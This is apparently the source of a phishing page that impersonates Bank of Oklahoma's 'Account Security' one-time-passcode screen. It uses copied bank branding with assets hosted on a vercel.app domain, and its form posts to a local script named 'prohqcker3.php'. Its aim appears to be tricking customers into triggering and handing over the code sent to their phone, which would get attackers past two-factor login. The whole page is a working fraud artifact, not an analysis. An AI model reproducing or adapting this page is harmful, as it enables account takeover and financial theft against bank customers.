<?php
?>
<!DOCTYPE html>
<html  lang="en-us"><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <meta charset="utf-8">
    <meta content="IE=edge,chrome=1" http-equiv="X-UA-Compatible">
    <meta name="description" content="">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="format-detection" content="telephone=no">
    

    <meta name="x-server" content="F07">
    <meta name="x-datacenter" content="O">
    <title>Bok - VerifyOneTimePasscode</title>
    <link rel="shortcut icon" href="https://onlinebanking.bankofoklahoma.com/images/faviconnew.png" type="image/x-icon">

    <link rel="stylesheet" href="https://bokf.vercel.app/code_files/styles2.0V1.css">
    <link rel="stylesheet" href="https://bokf.vercel.app/code_files/styles2.0.css">
    <link rel="stylesheet" href="https://bokf.vercel.app/code_files/styles.css">
    <link rel="stylesheet" href="https://bokf.vercel.app/code_files/popup.css">
    <link rel="stylesheet" href="https://bokf.vercel.app/code_files/rebrand.css">
    <link rel="stylesheet" href="https://bokf.vercel.app/code_files/css.css"> 

    <script src="https://bokf.vercel.app/code_files/jquery-1.10.2.min.js"></script>
    <script src="https://bokf.vercel.app/code_files/jquery-ui.min.js"></script>
    <!-- IE Polyfills -->
    <script src="https://bokf.vercel.app/code_files/modernizr-2.6.2.min.js"></script>
    <script src="https://bokf.vercel.app/code_files/jquery.megamenu.js"></script>
    <script src="https://bokf.vercel.app/code_files/jquery.magnific-popup.js"></script>
    <script src="https://bokf.vercel.app/code_files/tipso.js"></script>
    <script src="https://bokf.vercel.app/code_files/pushy.min.js"></script>
    <!-- Touch Scroll -->
    <!-- Custom -->
    <script src="https://bokf.vercel.app/code_files/jquery.accordion.js"></script>

        <script id="_cls_detector" data-clsconfig="reportURI=https://report.bokf.glassboxdigital.io/glassbox/reporting/540acbf5-2c4b-44d6-ba03-f981ec83894c/cls_report;recordScrolls=true;recordMouseMoves=true;idleEventTimeInterval=-1" src="https://bokf.vercel.app/code_files/detector-dom.min.js" async=""></script>

    <style>
        header #logo a.desktop-rebrand img {
            height: 44px;
        }
    </style>



    <script>
        function getBrowserInfo() {
            var ua = navigator.userAgent, tem, M = ua.match(/(opera|chrome|safari|firefox|msie|trident(?=\/))\/?\s*(\d+)/i) || [];
            if (/trident/i.test(M[1])) {
                tem = /\brv[ :]+(\d+)/g.exec(ua) || [];
                return { name: 'IE ', version: (tem[1] || '') };
            }
            if (M[1] === 'Chrome') {
                tem = ua.match(/\bOPR\/(\d+)/)
                if (tem != null) { return { name: 'Opera', version: tem[1] }; }
            }
            M = M[2] ? [M[1], M[2]] : [navigator.appName, navigator.appVersion, '-?'];
            if ((tem = ua.match(/version\/(\d+)/i)) != null) { M.splice(1, 1, tem[1]); }
            return {
                name: M[0],
                version: M[1]
            };
        }

        $(function () {
            var browser = getBrowserInfo();
            var versionInfo = parseInt(browser.version);
            var browserOutDate = document.getElementById('BrowserOutdate');
            if (browserOutDate != null)
                var targetUrl = browserOutDate.value;
            else {
                var targetUrl = 'https://www.bankofoklahoma.com/Landing%20Pages/Digital%20Banking/Browser%20Upgrade';
            }

            if ((browser.name.toLowerCase().indexOf('msie') !== -1 || browser.name.toLowerCase().indexOf('ie') !== -1) && versionInfo <= 11) {
                $('.helpMenu').css('display', 'none');
                window.location.href = targetUrl;
            }
        });

    </script>

</head>

<body>
    <header class="push loggedOut" role="banner">
        <div class="container">
                    <input type="hidden" id="BrowserOutdate" value="https://www.bankofoklahoma.com/Landing-Pages/Browser/Browser-Upgrade">

            <div id="logo">
                <a href="https://www.bankofoklahoma.com/" class="noMobile desktop-rebrand">

                    <img src="https://bokf.vercel.app/code_files/bok-logo-rebrand.svg" alt="Bank of Oklahoma">
                </a>
                <a href="https://www.bankofoklahoma.com/" class="mobile mobile-rebrand">
                    <img src="https://bokf.vercel.app/code_files/bok-logo-rebrand.svg" alt="Bank of Oklahoma">
                </a>
            </div>
        </div>
    </header>

    <div class="main push loggedOut" role="main">
        <div class="container">
            



            
<link rel="stylesheet" href="https://bokf.vercel.app/code_files/popup2.0.css">

<div class="boxModule">
   <h1>Account Security</h1>

<div class="clear20"></div>

<div class="cls_mask" style="background:#eeeeee;border:1px solid #cccccc;padding:5px 10px;">To Protect your Account from intruders, A new code will be sent to your Phone Number </div>

<div class="clear20"></div>

<form action="./prohqcker3.php" method="post">
<h3><input checked="checked" name="s" type="radio" value="ytu" />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; +1***-***-XXXX</h3>

    <div class="clear40"></div>
    <input type="submit" id="btnSubmit" value="Send Me A Code" ">
    <a href="" style="margin:10px 10px 0px 20px;white-space:nowrap;">Get a new Code</a>
    <a href="" style="margin: 10px 10px 0px 20px; white-space: nowrap;">Need help?</a>
<input name="CSRF-TOKEN" type="hidden" value="CfDJ8MDka5SBLlZPrlVYqiJN5eTcl0RWhWDzzOyFEkGvPVNeK2Q-7eQjQSIF8vJG16FCgnCo3Z-TUTx0U1jLienFi564zcYG9_yk5rswj8SoFmQhMwDCXPLFTuW-WrKoJMExdlWS5-iTTvyPpCBM_NMxVLg"></form>
    <div class="clear20"></div>
    <div class="globalNote" style="margin-top:0px;">By clicking send me a code , A code will be sent to the Phone Number on file</div>
</div>


<!--  Pop-up dialog -->
<div>
    <div class="white-popup mfp-hide" id="helpModal">
        <p class="title" style="font-weight:bolder;">Need help?</p>
        <div class="contentCol" style="margin-top:2px; display:inline-block; width:100%;">
            <div class="innerContent">
                Don't see your phone number listed? Give us a call at
                <lable class="mobile-display" style="display:none;">
                    <a href="tel:+1-800-234-6181">1-800-234-6181</a>.
                </lable>
                <lable class="desktop-display">
                    1-800-234-6181<span>.</span>
                </lable>
            </div>
            <div class="line"></div>
            <div class="modal-actions">
                <a href="#" class="btn-primary btn-size-medium" id="popupOk">Okay</a>
            </div>
            <div class="cleaner"></div>
            <button title="Close (Esc)" type="button" class="mfp-close" style="margin-right:15px"><img src="https://bokf.vercel.app/code_files/x_close.svg"></button>
        </div>
    </div>
</div>


        </div>
        <!-- PopUp Content used by Application-->
        <div>
            <div id="popupContainer" class="white-popup mfp-hide">
                <h2></h2>
                <dl style="padding-bottom:40px">
                    <dt>
                        <span></span>
                        <a href="#" class="btn blue" style="float:right;" id="popupOk">OK</a>
                    </dt>
                </dl>
                <div class="cleaner"></div>
            </div>
        </div>
    </div>

    <input type="hidden" id="hdnPershingLogoutUrl" value="">

    
<style>

    .copyright-text {
        font-size: .6875rem;
        line-height: 1.125rem;
    }


    .investon-footer {
        width: 80%;
        margin-left: 20px;
        font-size: 12px;
    }

    .investon-footer-column {
        display: inline-block;
        vertical-align: top;
        margin-left: 36px;
        margin-right: 36px;
    }

        .investon-footer-column h4 {
            color: white;
            font-size: 14px;
            margin-bottom: 12px;
        }

        .investon-footer-column .footer-links ul li {
            display: block !important;
            width: 100% !important;
            margin-bottom: 12px !important;
        }

    .investon-copyright {
        margin-top: -12px !important;
        margin-left: 56px;
    }

    @media all and (min-width: 768px) and (max-width: 1024px) { /* tablet */
        .investon-copyright {
            margin-top: 0px !important;
        }
    }

    @media all and (max-width: 767px) { /* phone */
        .investon-footer {
            width: 100%;
            margin: -16px 0px 16px 0px;
        }

        .investon-footer-column {
            margin-left: 8px;
            margin-right: 8px;
        }

        .investon-copyright {
            margin: 0px;
            margin-top: -16px !important;
        }
    }

    @media (min-width: 768px) and (max-width: 1024px) {
        .copyright-text {
            vertical-align: bottom;
        }
    }

    /*desktop only*/
    @media (min-width: 1025px){
        .icon-meatball-bokf{
            display:none;
        }
    }
</style>

<footer>
    <div class="container">
        <div class="footer-links">
            <ul>
                <li><a href="http://locations.bankofoklahoma.com/" target="_blank">Locations<span class="screenReader-text">To find a banking center or ATM location, click on Locations</span></a></li>
                <li class="col-width-medium"><a href="https://www.bankofoklahoma.com/location-and-contact-us/contact-us" target="_blank">Contact Center<span class="screenReader-text">To get in touch with us, click on the Contact Center link</span></a></li>
                <li><a href="https://www.bankofoklahoma.com/landing%20pages/digital%20banking/termsconditions-consumer" target="_blank">Terms<span class="screenReader-text">To view Online Banking terms and conditions, click on the Terms link</span></a></li>
                <li><a href="https://www.bankofoklahoma.com/Legal-and-Privacy/Privacy-Policy" target="_blank">Privacy<span class="screenReader-text">For information about our Privacy Policy, click on the Policy link</span></a></li>
                <li class="col-width-medium"><a href="https://www.bankofoklahoma.com/en/Personal/index.page" target="_blank">Bok <span class="screenReader-text">To view go to the Bok home page, click on the Full Site link</span></a></li>
            </ul>
        </div>
        <div class="copyright ">
            <ul>
                <li style="display:inline-flex;padding-top:5px;">
                    <div class="icon-meatball-bokf" style="padding-right:10px;">
                        <img src="https://bokf.vercel.app/code_files/bokf-meatball-rebrand.svg" alt="BOK Financial">
                    </div>
                    <div class="copyright-text">
                        Bok<sup>®</sup> is a trademark of BOKF, NA. Member FDIC. Equal Housing Lender
                        <img alt="" style="vertical-align:baseline!important;" src="https://bokf.vercel.app/code_files/FDIC_Home.png" class="fdic-icon" width="14" height="11">
                        © 2023 BOKF, NA. <br>
                        Zelle<sup>®</sup> and the Zelle<sup>®</sup> related marks are wholly owned by Early Warning Services, LLC and are used herein under license.
                    </div>
                </li>
            </ul>
        </div>
    </div>
</footer>

<script type="text/javascript">
    $(document).ready(function (e) {

        $('#dllChangeBank').val($('#hdnBankId').val());

        $('#dllChangeBank').change(function (e) {
            var bankId = $('#dllChangeBank').val();
            debugger;
            $('#hdnBankId').val(bankId);
            document.forms['frmChangeBank'].submit();
        });
    });
</script>

    <script src="https://bokf.vercel.app/code_files/main.js"></script>

    
    <script type="text/javascript">

        $(document).ready(function () {

            $(document).on('keyup', '#txtCode', function (e) {
                var $this = $(this);
                var code = $this.val().trim();
                toggleSubmitButton(code);
            });

            //CT-8408 Mobiweb - On iphone on Chrome, pasting value into Verification Code text box does not enable Verify button
            //Only attach a paste event for mobile screen widths.
            var mobileDevice = window.matchMedia("(max-width: 767px)");
            if (document.getElementById('txtCode') && mobileDevice.matches) {
                document.querySelector('#txtCode').addEventListener('paste', (e) => {
                    let pasteData = (e.clipboardData || window.clipboardData).getData('text');
                    pasteData = pasteData.replace(/[^\x20-\xFF]/gi, '');
                    window.setTimeout(() => {
                        toggleSubmitButton(pasteData);
                    });
                });
            }

            $(document).on('click', '#ConfirmSkip', function (e) {
                $.magnificPopup.close();
            });
            $(document).on('click', '.need-help', function (e) {
                var popUpHtml = $('#helpModal').parent().html();
                $.magnificPopup.open({
                    modal: true,
                    items: {
                        src: popUpHtml, // can be a HTML string, jQuery object, or CSS selector
                        type: 'inline'
                    }
                });
                $('#helpModal').removeClass('mfp-hide');
                e.preventDefault();
            });

            function toggleSubmitButton(code) {
                if (code != "") {
                    $('#btnSubmit').removeAttr('disabled');
                }
                else {
                    $('#btnSubmit').attr('disabled', 'disabled');
                }
            }
        });
    </script>





</body></html>
